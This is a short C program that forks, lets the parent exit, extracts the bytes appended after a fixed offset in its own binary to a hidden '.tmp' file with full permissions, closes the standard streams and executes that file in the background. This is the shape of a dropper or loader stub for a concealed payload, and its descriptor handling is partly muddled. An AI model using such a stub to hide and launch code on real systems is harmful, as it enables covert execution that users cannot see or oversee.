#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <fcntl.h>

#define DEAMON_OFFSET 9032

int	main(int ac, char **av) {
	int		pid = fork();
	int		buff_fd, exec_fd;
	char	*buffer;
	size_t	size;

	if (pid > 0)
	{
		exit(1);
	}
	else if (pid < 0)
		return 0;
	if ((buff_fd = open(av[0], O_RDONLY)) == -1) {
		return 1;
	}
	size = lseek(buff_fd, 0, SEEK_END) - DEAMON_OFFSET;
	buffer = malloc(size);
	lseek(buff_fd, DEAMON_OFFSET, SEEK_SET);
	read(buff_fd, buffer, size);
	exec_fd = open(".tmp", O_WRONLY | O_CREAT, 0777);
	write(exec_fd, buffer, size);
	close(buff_fd);
	close(exec_fd);
	close(0);
	int	piped[2];
	piped[0] = dup(1);
	piped[1] = open(".trace", O_WRONLY | O_CREAT, 0777);
	pipe(piped);
	close(1);
	close(2);
	execve(".tmp", av, __environ);
}